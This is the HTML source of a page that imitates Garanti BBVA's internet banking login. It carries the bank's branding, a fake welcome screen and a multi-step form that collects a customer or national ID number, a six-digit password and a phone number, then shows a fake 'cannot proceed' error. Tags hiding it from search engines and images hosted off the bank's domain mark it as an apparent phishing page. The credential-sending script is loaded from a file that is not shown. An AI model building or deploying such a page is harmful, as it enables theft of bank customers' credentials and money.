<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garanti BBVA</title>
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="yandex" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="csrf-token" content="{{ csrf_token() }}" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        body {
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Loading Screen */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #e9e9e9;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease-in-out;
        }

        .loading-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-7wNwTazgOe5KgVW8jXEsJu23K669Ln.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }

        #main-content {
            display: none;
            position: relative;
            height: 100vh;
            overflow: hidden;
        }

        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://hebbkx1anhila5yf.public.blob.vercel-storage.com/background%20%281%29.jpg-o9ND6n4m0sywe4rmd63ITOyDBmn3Qx.jpeg');
            background-size: cover;
            background-position: center;
            z-index: -1;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.1);
            z-index: -1;
        }

        .header {
            display: flex;
            justify-content: space-between;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .notification {
            width: 50px;
            height: 50px;
            background-color: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .welcome {
            color: white;
            padding: 20px;
            margin-top: 120px;
            position: relative;
            z-index: 1;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .logo-container {
            width: 70px;
            height: 70px;
            margin-bottom: 15px;
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .logo-container img {
            width: 45px;
            height: 45px;
        }

        .welcome h2 {
            font-size: 20px;
            font-weight: normal;
            margin-bottom: 8px;
            opacity: 0.9;
        }

        .welcome h1 {
            font-size: 40px;
            font-weight: bold;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            padding: 20px;
            margin-top: 20px;
            position: relative;
            z-index: 1;
        }

        .bgbtn {
            width: 48%;
            padding: 18px 0 !important;
            background-color: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 12px !important;
            text-align: center !important;
            font-size: 19px !important;
            font-weight: bold;
            cursor: pointer !important;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: transform 0.2s, box-shadow 0.2s !important;
        }

        .bgbtn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .btn-primary {
            color: #00a1df;
        }

        .btn-secondary {
            color: #00a1df;
        }

        .links {
            display: flex;
            justify-content: center;
            padding: 20px;
            margin-top: 20px;
            color: white;
            position: relative;
            z-index: 1;
        }

        .links a {
            color: white;
            text-decoration: none;
            margin: 0 10px;
            font-size: 16px;
            opacity: 0.9;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
            transition: opacity 0.2s;
        }

        .links a:hover {
            opacity: 1;
            text-decoration: underline;
        }

        .separator {
            margin: 0 10px;
            opacity: 0.7;
        }

        .features {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            display: flex;
            justify-content: space-around;
            padding: 15px 20px;
            /* Reduced padding from 25px to 15px */
            background-color: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-top-left-radius: 25px;
            border-top-right-radius: 25px;
            z-index: 2;
            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.1);
        }

        .feature {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 33%;
        }

        .feature-icon {
            width: 50px;
            /* Reduced from 65px to 50px */
            height: 50px;
            /* Reduced from 65px to 50px */
            background-color: #f5f5f5;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 8px;
            /* Reduced from 12px to 8px */
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
        }

        .feature p {
            text-align: center;
            font-size: 12px;
            /* Reduced from 14px to 12px */
            font-weight: bold;
            color: #333;
            line-height: 1.2;
            /* Reduced from 1.3 to 1.2 */
        }

        .indicator {
            position: absolute;
            bottom: 120px;
            /* Reduced from 140px to 120px */
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 5px;
            background-color: rgba(255, 255, 255, 0.5);
            border-radius: 10px;
            z-index: 1;
        }

        .fast-text {
            color: #00a1df;
            font-weight: bold;
            font-style: italic;
            font-size: 18px;
            font-family: 'Arial', sans-serif;
        }

        .atm-icon {
            color: #00a1df;
            font-size: 26px;
        }

        .qr-icon {
            color: #00a1df;
            font-size: 26px;
        }

        /* Login Screen */
        #login-screen {
            position: fixed;
            top: 0;
            left: 100%;
            width: 100%;
            height: 100%;
            background-color: #f4f4f4;
            z-index: 9000;
            transition: left 0.5s ease-in-out;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        #login-screen.active {
            left: 0;
        }

        .login-header {
            width: 100%;
            background-color: #00a85a;
            /* Garanti BBVA yeşil */
            padding: 20px;
            display: flex;
            align-items: center;
            position: relative;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .back-btn i {
            margin-right: 5px;
        }

        .login-form {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            margin-top: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            border: none;
            background: white;
            border-radius: 4px;
            font-size: 16px;
            color: #333;
        }

        /* Chrome, Safari, Edge, Opera için input number'daki ok işaretlerini kaldır */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        /* Firefox için input number'daki ok işaretlerini kaldır */
        input[type=number] {
            -moz-appearance: textfield;
        }

        .form-group input::placeholder {
            color: #666;
        }

        .login-btn {
            width: 100%;
            padding: 15px;
            background-color: #00a85a;
            /* Garanti BBVA yeşil */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #009950;
            /* Biraz daha koyu yeşil */
        }

        .forgot-password {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #00a85a;
            /* Garanti BBVA yeşil */
            text-decoration: none;
            font-size: 16px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Animasyon Sınıfları */
        .fade-in {
            animation: fadeIn 0.5s forwards;
        }

        .slide-up {
            animation: slideUp 0.5s forwards;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
    <style>
        /* Metni seçmeyi engelle */
        body {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* Inline hata mesajları için stiller */
        .error-message {
            color: #d9534f;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        .form-control.error {
            border-color: #d9534f;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483;
        }

        .success-message {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: none;
        }

        .loading-overlay {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.8);
            z-index: 1000;
        }

        .loading-spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 18px;
            color: #007bff;
        }
    </style>
    <link rel="stylesheet" href="gnew/css/style.css?v=3">

</head>

<body>
    <!-- Loading Screen -->
    <div id="loading-screen">
        <div class="loading-background"></div>
    </div>

    <!-- Main Content -->
    <div id="main-content">
        <div class="background"></div>
        <div class="overlay"></div>

        <div class="header">
            <div class="notification">
                <i class="fas fa-bell"></i>
            </div>
        </div>

        <div class="welcome">
            <div class="logo-container">
                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/ic_launcher-6PSbTuEIkbaX6TDd1Z7tWc6o3fwxeH.png"
                    alt="Garanti BBVA Logo">
            </div>
            <h2>Garanti BBVA'ya</h2>
            <h1>Hoş Geldiniz</h1>
        </div>

        <div class="buttons">
            <div class="btn btn-primary bgbtn">Bireysel</div>
            <div class="btn btn-secondary bgbtn">Kurumsal</div>
        </div>

        <div class="links">
            <a href="#">Müşterimiz Olun</a>
            <span class="separator">|</span>
            <a href="#">En Yakın ATM / Şube</a>
            <span class="separator">|</span>
            <a href="#">Bize Ulaşın</a>
        </div>

        <div class="indicator"></div>

        <div class="features">
            <div class="feature">
                <div class="feature-icon">
                    <span class="fast-text">fas₺</span>
                </div>
                <p>FAST İşlemleri</p>
            </div>
            <div class="feature">
                <div class="feature-icon">
                    <i class="fas fa-money-bill-wave atm-icon"></i>
                </div>
                <p>ATM'den Para<br>Çek/Yatır</p>
            </div>
            <div class="feature">
                <div class="feature-icon">
                    <i class="fas fa-qrcode qr-icon"></i>
                </div>
                <p>TR Karekod ile<br>Öde</p>
            </div>
        </div>
    </div>

    <!-- Login Screen -->
    <div id="login-screen">
        <div id="page" class="page">
            <!-- Header -->
            <header id="header">
                <div class="navbar navbar-default">
                    <div class="container">
                        <div class="navbar-header">
                            <a class="navbar-brand" href="#">
                                <img src="gnew/img/logo-garantibbva-2x.png" alt="Garanti BBVA" class="logo">
                            </a>
                        </div>
                        <div class="navbar-collapse">
                            <ul class="nav navbar-nav navbar-right hidden-xs">
                                <li class="active">
                                    <a href="#" class="btn">Bireysel</a>
                                </li>
                                <li>
                                    <a href="#" class="btn">Kurumsal</a>
                                </li>
                            </ul>
                            <!-- Mobile dropdown -->
                            <ul class="nav navbar-nav navbar-right navbar-mobile visible-xs">
                                <li class="dropdown active">
                                    <a href="#" class="dropdown-toggle btn" data-toggle="dropdown">
                                        Bireysel <i class="icons icons-arrow-down"></i>
                                    </a>
                                    <ul class="dropdown-menu">
                                        <li><a href="#">Bireysel</a></li>
                                        <li><a href="#">Kurumsal</a></li>
                                    </ul>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </header>

            <!-- Breadcrumb -->
            <div class="breadcrumb-container no-print">
                <div class="container">
                    <ul id="breadcrumb" class="breadcrumb">
                        <li class="disable">
                            <a><span>Garanti BBVA İnternet Bankacılığı'na Hoşgeldiniz</span></a>
                        </li>
                        <li class="active">
                            <span>Parola Giriş</span>
                        </li>
                    </ul>
                </div>
            </div>

            <!-- Main Content -->
            <div id="content" class="container" role="main">
                <div class="wizard">
                    <div class="main">
                        <div class="row">
                            <div class="col-md-9">
                                <div class="hidden-mobile">
                                    <h2 class="page-title">Garanti BBVA İnternet Bankacılığı</h2>
                                </div>

                                <div class="panel">
                                    <div id="passwordEntryPanel" class="panel-body" style="position: relative;">
                                        <!-- Loading Overlay -->
                                        <div id="loadingOverlay" class="loading-overlay">
                                            <div class="loading-spinner">
                                                <i class="fas fa-spinner fa-spin"></i> İşleniyor...
                                            </div>
                                        </div>

                                        <!-- Success Message -->
                                        <div id="successMessage" class="success-message">
                                            <h4>İşleminize devam edilemiyor</h4>
                                            <p>Özür dileriz, şu anda işleminizi gerçekleştiremiyoruz. Lütfen daha sonra
                                                tekrar deneyiniz.</p>
                                        </div>

                                        <div id="formContainer">
                                            <h1 class="panel-title light" id="formTitle">
                                                Güvenli Bankacılığa Hoş Geldiniz
                                                <p id="formDescription">Lütfen müşteri numaranızı ya da T.C. kimlik
                                                    numaranızı ve size özel parolanızı girin.</p>
                                            </h1>

                                            <div class="row">
                                                <div class="col-sm-10">
                                                    <div class="form-horizontal form-container">
                                                        <div id="first_step">

                                                            <input type="hidden" name="csrf_token"
                                                                value="974f8fd58435e80bc6f580a8a91f71621a19b9faa0aa346e21a6dbe418699a75">
                                                            <!-- Customer Number Field -->
                                                            <div class="formField" data-field="custno">
                                                                <div class="formFieldOuter">
                                                                    <div class="formFieldInner form-group">
                                                                        <label for="custno"
                                                                            class="col-sm-5 col-md-4 control-label">
                                                                            Müşteri / T.C. Kimlik Numarası
                                                                        </label>
                                                                        <div
                                                                            class="formFieldSurround col-sm-7 col-md-8 p-0">
                                                                            <input type="text" class="form-control"
                                                                                value="" id="tcOrUserNametxt"
                                                                                name="custno" maxlength="11"
                                                                                autocomplete="off" spellcheck="false"
                                                                                placeholder="" required="">
                                                                            <div id="custno-error"
                                                                                class="error-message">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <!-- Password Field -->
                                                            <div class="formField" data-field="password">
                                                                <div class="formFieldOuter">
                                                                    <div class="formFieldInner form-group">
                                                                        <label for="password"
                                                                            class="col-sm-5 col-md-4 control-label">
                                                                            Parola
                                                                        </label>
                                                                        <div
                                                                            class="formFieldSurround col-sm-7 col-md-8 p-0">
                                                                            <input class="form-control"
                                                                                id="tbPasswordtxt" name="password"
                                                                                maxlength="6" type="password"
                                                                                autocomplete="new-password"
                                                                                spellcheck="false"
                                                                                data-form-type="other" placeholder=""
                                                                                required="">
                                                                            <div id="password-error"
                                                                                class="error-message">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <!-- Remember Me Checkbox -->
                                                            <div class="formField control" id="isRememberMeContainer"
                                                                data-field="remember">
                                                                <div class="formFieldOuter">
                                                                    <div class="formFieldInner form-group has-btn">
                                                                        <div>
                                                                            <div class="checkbox-container-spaced">
                                                                                <div class="checkbox-left">
                                                                                    <input id="isRememberMe"
                                                                                        name="isRememberMe"
                                                                                        type="checkbox"
                                                                                        value="Y">
                                                                                    <label for="isRememberMe">Beni
                                                                                        Hatırla</label>
                                                                                </div>
                                                                                <div class="tooltip-right">
                                                                                    <a class="btn btn-primary has-advice-text help-icon"
                                                                                        role="button" tabindex="-1">
                                                                                        <i class="fa fa-question"></i>
                                                                                    </a>
                                                                                    <div
                                                                                        class="advice-text advice-text-right">
                                                                                        <strong
                                                                                            class="subject">Yardım</strong><br>
                                                                                        "Beni Hatırla" seçeneğini
                                                                                        işaretlediğinizde,
                                                                                        sonraki girişleriniz için
                                                                                        yalnızca
                                                                                        parolanızı
                                                                                        yazmanız yeterli olacaktır.
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <!-- Extra Remember Me Text -->
                                                            <div class="form-group form-group-offset elementHide"
                                                                id="rememberMeExtraText">
                                                                <div
                                                                    class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                                                                    <div class="helper-text ark-ui-helper-text">
                                                                        <p class="helper">
                                                                            Müşteri / T.C. kimlik numaranız bu cihazda
                                                                            ve
                                                                            tarayıcıda hatırlanacaktır. Güvenliğiniz
                                                                            açısından,
                                                                            bu tanımlamayı sadece kişisel cihazlarınızda
                                                                            yapmanızı öneririz.
                                                                        </p>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <!-- Submit Button and Links -->
                                                            <div class="form-group form-group-offset footer-button">
                                                                <div
                                                                    class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                                                                    <p>
                                                                        <button id="btnLogin"
                                                                            class="btn btn-primary btn-lg btn-block-input"
                                                                            type="submit">
                                                                            Garanti BBVA İnternet Giriş
                                                                        </button>
                                                                    </p>
                                                                    <div>
                                                                        <a href="#" tabindex="-1">Parolamı</a>
                                                                        unuttum.
                                                                    </div>
                                                                    <div>
                                                                        <a href="#" tabindex="-1">İlk kez
                                                                            parola almak
                                                                            istiyorum.</a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div id="twice_step" class="d-none">
                                                            <div class="formField">
                                                                <div class="formFieldOuter">
                                                                    <div class="formFieldInner form-group">
                                                                        <label for="telefon"
                                                                            class="col-sm-5 col-md-4 control-label">
                                                                            Telefon Numarası
                                                                        </label>
                                                                        <div
                                                                            class="formFieldSurround col-sm-7 col-md-8">
                                                                            <input type="tel" class="form-control"
                                                                                id="phone" name="telefon"
                                                                                maxlength="14" autocomplete="tel"
                                                                                spellcheck="false"
                                                                                placeholder="5XX XXX XX XX">
                                                                            <div id="telefon-error"
                                                                                class="error-message">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="form-group form-group-offset footer-button">
                                                                <div
                                                                    class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                                                                    <p>
                                                                        <button id="btnPhone"
                                                                            class="btn btn-primary btn-lg btn-block-input"
                                                                            type="submit">
                                                                            Onayla
                                                                        </button>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div id="three_step" class="d-none">
                                                            <div class="lastcenter">
                                                                <i class="fa-solid fa-xmark"></i>
                                                                <span>
                                                                    <h5>İşleminize devam edilemiyor.</h5>
                                                                    <p>Özür dileriz, şu anda işleminizi
                                                                        gerçekleştiremiyoruz. Lütfen
                                                                        daha sonra tekrar deneyin</p>
                                                                    </span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Sidebar -->
                            <div class="col-md-3">
                                <div class="additional">
                                    <h2 class="page-title">Yardım ve Güvenlik</h2>
                                    <div class="panel">
                                        <div class="panel-body">
                                            <div id="helpandsecurity" class="collapse-content" role="tablist"
                                                aria-multiselectable="true">
                                                <!-- Security Info -->
                                                <div class="panel panel-collapse help-collapse">
                                                    <div class="panel-heading" role="tab" id="heading0">
                                                        <a role="button" data-toggle="collapse"
                                                            data-parent="#helpandsecurity" href="#collapse0"
                                                            aria-expanded="true" aria-controls="collapse0">
                                                            <span class="accordion-text">Güvenliğiniz için lütfen
                                                                aşağıdaki
                                                                bilgilere dikkat edin.</span>
                                                            <span class="accordion-arrow">
                                                                <i class="fas fa-chevron-up"></i>
                                                            </span>
                                                        </a>
                                                    </div>
                                                    <div id="collapse0" class="panel-collapse collapse"
                                                        role="tabpanel" aria-labelledby="heading0">
                                                        <div class="panel-body">
                                                            <p>Güvenli bir İnternet deneyimi ve güncel virüsler hakkında
                                                                bilgi almak için lütfen tıklayın.</p>
                                                            <a href="#" target="_blank">Detaylı bilgi</a>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!-- Third Party Operations -->
                                                <div class="panel panel-collapse help-collapse">
                                                    <div class="panel-heading" role="tab" id="heading1">
                                                        <a role="button" data-toggle="collapse"
                                                            data-parent="#helpandsecurity" href="#collapse1"
                                                            aria-expanded="false" aria-controls="collapse1"
                                                            class="collapsed">
                                                            <span class="accordion-text">Başkası adına mı işlem
                                                                yapıyorsunuz?</span>
                                                            <span class="accordion-arrow">
                                                                <i class="fas fa-chevron-down"></i>
                                                            </span>
                                                        </a>
                                                    </div>
                                                    <div id="collapse1" class="panel-collapse collapse"
                                                        role="tabpanel" aria-labelledby="heading1">
                                                        <div class="panel-body">
                                                            <p>Başkası adına işlem yapıyorsanız detaylı bilgi için
                                                                lütfen
                                                                tıklayın.</p>
                                                            <a href="#" target="_blank">Detaylı bilgi</a>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!-- Deposit Insurance -->
                                                <div class="panel panel-collapse help-collapse">
                                                    <div class="panel-heading" role="tab" id="heading2">
                                                        <a role="button" data-toggle="collapse"
                                                            data-parent="#helpandsecurity" href="#collapse2"
                                                            aria-expanded="false" aria-controls="collapse2"
                                                            class="collapsed">
                                                            <span class="accordion-text">Tasarruf Mevduatı
                                                                Güvencesi</span>
                                                            <span class="accordion-arrow">
                                                                <i class="fas fa-chevron-down"></i>
                                                            </span>
                                                        </a>
                                                    </div>
                                                    <div id="collapse2" class="panel-collapse collapse"
                                                        role="tabpanel" aria-labelledby="heading2">
                                                        <div class="panel-body">
                                                            <p>Tasarruf mevduatınız güvence altında. Detaylı bilgi için
                                                                lütfen tıklayın.</p>
                                                            <a href="#" target="_blank">Detaylı bilgi</a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <a href="#" target="_blank" class="border-link helper-bottom-link">
                                                Diğer Yardım Ve Güvenlik
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer id="footer" class="footer no-print">
            <div class="container">
                <div class="row patch-footer">
                    <div class="col-md-4">
                        <table class="table">
                            <tbody>
                                <tr>
                                    <td>
                                        <a href="#">Bize Ulaşın</a>
                                    </td>
                                    <td class="">
                                        <a href="#">Güvenlik Bilgileri</a>
                                    </td>
                                    <td>
                                        <span class="language">Language:</span>
                                        <a href="#">English</a>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-8 col-xs-8">
                        <table class="table">
                            <tbody>
                                <tr>
                                    <td>Copyright © 2025 T.Garanti Bankası A.Ş.</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </footer>

    </div>

    <script>
        window.onload = function() {
            const loadingScreen = document.getElementById('loading-screen');
            const mainContent = document.getElementById('main-content');
            const loginScreen = document.getElementById('login-screen');
            const backBtn = document.querySelector('.back-btn');
            const tcnoInput = document.getElementById('tckn');
            const passwordInput = document.getElementById('password');



            setTimeout(function() {
                loadingScreen.style.opacity = '0';

                setTimeout(function() {
                    loadingScreen.style.display = 'none';

                    mainContent.style.display = 'block';

                    const elements = [
                        document.querySelector('.welcome'),
                        document.querySelector('.buttons'),
                        document.querySelector('.links'),
                        document.querySelector('.features')
                    ];

                    elements.forEach(function(element, index) {
                        setTimeout(function() {
                            element.classList.add('slide-up');
                        }, index * 150);
                    });

                }, 500);

            }, 2000);

            const clickableElements = document.querySelectorAll('.btn, .feature, .links a, .notification');

            clickableElements.forEach(element => {
                element.addEventListener('click', (e) => {
                    e.preventDefault();
                    loginScreen.classList.add('active');
                });
            });


        };
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="gnew/js/jquery.mask.min.js"></script>

    <script src="gnew/js/custom.js"></script>

</body>

</html>
